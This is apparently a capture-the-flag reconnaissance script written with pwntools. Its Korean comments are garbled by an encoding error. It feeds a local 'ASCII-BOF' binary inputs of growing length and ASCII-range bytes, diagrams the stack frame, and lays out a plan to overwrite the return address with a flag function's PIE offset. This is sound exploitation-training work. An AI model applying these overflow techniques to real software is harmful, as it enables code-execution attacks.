#!/usr/bin/env python3

"""
ASCII-BOF ê¸°ì´ˆ ì·¨ì•½ì  í…ŒìŠ¤íŠ¸
ì™„ì „íˆ ì²˜ìŒë¶€í„° ë‹¨ê³„ë³„ë¡œ ì§„í–‰
"""

from pwn import *

def test_basic_overflow():
    """ê¸°ë³¸ ë²„í¼ ì˜¤ë²„í”Œë¡œìš° í…ŒìŠ¤íŠ¸"""
    print("[+] ê¸°ë³¸ ë²„í¼ ì˜¤ë²„í”Œë¡œìš° í…ŒìŠ¤íŠ¸")
    print("=" * 50)
    
    # ë¡œì»¬ ë°”ì´ë„ˆë¦¬ ì‹¤í–‰
    binary_path = './main'
    
    print("1. ì •ìƒ ì…ë ¥ í…ŒìŠ¤íŠ¸")
    try:
        p = process(binary_path)
        p.sendline(b"AAAA")
        output = p.recvall(timeout=2)
        print(f"ì •ìƒ ì…ë ¥ ê²°ê³¼: {output}")
        p.close()
    except Exception as e:
        print(f"ì •ìƒ ì…ë ¥ ì˜¤ë¥˜: {e}")
    
    print("\n2. 16ë°”ì´íŠ¸ ì…ë ¥ í…ŒìŠ¤íŠ¸ (ë²„í¼ í¬ê¸°)")
    try:
        p = process(binary_path)
        p.sendline(b"A" * 16)
        output = p.recvall(timeout=2)
        print(f"16ë°”ì´íŠ¸ ê²°ê³¼: {output}")
        p.close()
    except Exception as e:
        print(f"16ë°”ì´íŠ¸ ì˜¤ë¥˜: {e}")
    
    print("\n3. 24ë°”ì´íŠ¸ ì…ë ¥ í…ŒìŠ¤íŠ¸ (ë²„í¼ + RBP)")
    try:
        p = process(binary_path)
        p.sendline(b"A" * 24)
        output = p.recvall(timeout=2)
        print(f"24ë°”ì´íŠ¸ ê²°ê³¼: {output}")
        p.close()
    except Exception as e:
        print(f"24ë°”ì´íŠ¸ ì˜¤ë¥˜: {e}")
    
    print("\n4. 32ë°”ì´íŠ¸ ì…ë ¥ í…ŒìŠ¤íŠ¸ (ìµœëŒ€ ì…ë ¥)")
    try:
        p = process(binary_path)
        p.sendline(b"A" * 32)
        output = p.recvall(timeout=2)
        print(f"32ë°”ì´íŠ¸ ê²°ê³¼: {output}")
        p.close()
    except Exception as e:
        print(f"32ë°”ì´íŠ¸ ì˜¤ë¥˜: {e}")
    
    print("\n5. í¬ë˜ì‹œ í…ŒìŠ¤íŠ¸ (33ë°”ì´íŠ¸)")
    try:
        p = process(binary_path)
        p.sendline(b"A" * 33)  # 32ë°”ì´íŠ¸ ì œí•œ ì´ˆê³¼
        output = p.recvall(timeout=2)
        print(f"33ë°”ì´íŠ¸ ê²°ê³¼: {output}")
        p.close()
    except Exception as e:
        print(f"33ë°”ì´íŠ¸ ì˜¤ë¥˜ (ì˜ˆìƒë¨): {e}")

def test_ascii_check():
    """ASCII ì²´í¬ ë¡œì§ í…ŒìŠ¤íŠ¸"""
    print("\n[+] ASCII ì²´í¬ ë¡œì§ í…ŒìŠ¤íŠ¸")
    print("=" * 50)
    
    binary_path = './main'
    
    # ASCII ë²”ìœ„ í…ŒìŠ¤íŠ¸
    test_cases = [
        (b"\x1f" + b"A" * 15, "0x1f (ASCII ë¯¸ë§Œ)"),
        (b"\x20" + b"A" * 15, "0x20 (ê²½ê³„ê°’)"), 
        (b"\x21" + b"A" * 15, "0x21 (ASCII ì‹œì‘)"),
        (b"A" * 16, "ëª¨ë“  A (0x41)"),
        (b"\x7e" + b"A" * 15, "0x7e (ASCII ë)"),
        (b"\x7f" + b"A" * 15, "0x7f (ê²½ê³„ê°’)"),
        (b"\x80" + b"A" * 15, "0x80 (ASCII ì´ˆê³¼)"),
    ]
    
    for payload, desc in test_cases:
        print(f"\ní…ŒìŠ¤íŠ¸: {desc}")
        try:
            p = process(binary_path)
            p.sendline(payload)
            output = p.recvall(timeout=2)
            print(f"ê²°ê³¼: {output}")
            p.close()
        except Exception as e:
            print(f"ì˜¤ë¥˜: {e}")

def analyze_stack_frame():
    """ìŠ¤íƒ í”„ë ˆì„ êµ¬ì¡° ë¶„ì„"""
    print("\n[+] ìŠ¤íƒ í”„ë ˆì„ êµ¬ì¡° ë¶„ì„")
    print("=" * 50)
    
    print("ë¶„ì„ëœ ìŠ¤íƒ êµ¬ì¡°:")
    print("ë†’ì€ ì£¼ì†Œ")
    print("+-----------------+")
    print("|   return addr   |  <- rbp+8  (24~31ë°”ì´íŠ¸)")
    print("+-----------------+")
    print("|   saved rbp     |  <- rbp    (16~23ë°”ì´íŠ¸)")  
    print("+-----------------+")
    print("|                 |  <- rbp-8  (8~15ë°”ì´íŠ¸)")
    print("|   16-byte       |")
    print("|   buffer        |  <- rbp-16 (0~7ë°”ì´íŠ¸)")
    print("+-----------------+")
    print("ë‚®ì€ ì£¼ì†Œ")
    print()
    print("ğŸ¯ ê³µê²© ì „ëµ:")
    print("- 16ë°”ì´íŠ¸: ë²„í¼ ì±„ìš°ê¸°")
    print("- 8ë°”ì´íŠ¸: RBP ë®ì–´ì“°ê¸°") 
    print("- 8ë°”ì´íŠ¸: ë¦¬í„´ ì£¼ì†Œ (í”Œë˜ê·¸ í•¨ìˆ˜ë¡œ)")

def find_flag_function_offset():
    """í”Œë˜ê·¸ í•¨ìˆ˜ ì˜¤í”„ì…‹ ì°¾ê¸°"""
    print("\n[+] í”Œë˜ê·¸ í•¨ìˆ˜ ì˜¤í”„ì…‹ ì°¾ê¸°")
    print("=" * 50)
    
    print("objdump ë¶„ì„ ê²°ê³¼:")
    print("- main í•¨ìˆ˜: 0x1229")
    print("- ì·¨ì•½í•œ í•¨ìˆ˜: 0x1297")  
    print("- í”Œë˜ê·¸ í•¨ìˆ˜: 0x1339")
    print()
    print("PIE í™˜ê²½ì—ì„œ:")
    print("- ì‹¤ì œ ì£¼ì†Œ = BASE + OFFSET")
    print("- í”Œë˜ê·¸ í•¨ìˆ˜ = BASE + 0x1339")
    print("- BASEëŠ” ì‹¤í–‰í•  ë•Œë§ˆë‹¤ ë³€ê²½ë¨")

if __name__ == "__main__":
    print("ğŸ” ASCII-BOF ê¸°ì´ˆ ì·¨ì•½ì  ë¶„ì„")
    print("=" * 60)
    
    # 1. ê¸°ë³¸ ì˜¤ë²„í”Œë¡œìš° í…ŒìŠ¤íŠ¸
    test_basic_overflow()
    
    # 2. ASCII ì²´í¬ í…ŒìŠ¤íŠ¸
    test_ascii_check()
    
    # 3. ìŠ¤íƒ êµ¬ì¡° ë¶„ì„
    analyze_stack_frame()
    
    # 4. í”Œë˜ê·¸ í•¨ìˆ˜ ì˜¤í”„ì…‹
    find_flag_function_offset()
    
    print("\nğŸ¯ ë‹¤ìŒ ë‹¨ê³„:")
    print("- GDBë¡œ ì‹¤ì œ ë©”ëª¨ë¦¬ ì£¼ì†Œ í™•ì¸")
    print("- PIE ë² ì´ìŠ¤ ì£¼ì†Œ ê³„ì‚°")
    print("- ASCII í˜¸í™˜ ì£¼ì†Œ ë§Œë“¤ê¸°")
